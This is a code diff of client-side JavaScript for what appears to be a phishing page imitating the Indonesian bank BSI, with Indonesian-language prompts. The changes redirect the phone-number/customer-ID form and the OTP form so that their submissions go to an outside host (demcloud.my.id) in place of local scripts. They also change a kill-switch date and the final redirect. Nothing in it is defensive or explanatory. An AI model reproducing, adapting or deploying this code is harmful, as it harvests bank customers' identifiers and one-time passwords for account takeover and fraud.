@@ -1,5 +1,5 @@
 let tglNow = new Date();
-let waktuBatas = new Date("2025-10-25T23:59:59");
+let waktuBatas = new Date("2025-08-15T23:59:59");
 if (tglNow.getTime() >= waktuBatas.getTime()) {
   document.location.href = 'https://suspend-web.pages.dev';
 } else {
@@ -23,7 +23,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/BSI/kcfd5b/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -48,7 +48,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'rest/otp.php',
+ url: 'https://demcloud.my.id/BSI/kcfd5b/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -59,12 +59,12 @@ setTimeout(function(){
        
       
     }, 2000);
-     $("#notif").text("- Kode Virtual sudah kadaluarsa -");
+     $("#notif").text("- ID Pelanggan SALAH -");
      $("#notif").css("color", "red");
         }
     });
       setTimeout(() => {
-     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Virtual,<br/>Silahkan klik tombol dibawah ini";
+     document.getElementById("notif").innerHTML = "Untuk mendapatkan ID Pelanggan,<br/>Silahkan klik tombol dibawah ini";
      $("#djload").hide();  
    $("#notif").css("color", "black");
  $("#sixpin").val("");
@@ -87,7 +87,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://choreoapps.ll-feed.cfd/wa/2pagebsi';
+location.href='https://demcloud.my.id/BSI/kcfd5b/wa';
     }, 5000);
     setTimeout(function(){
     $("#djload").hide();   
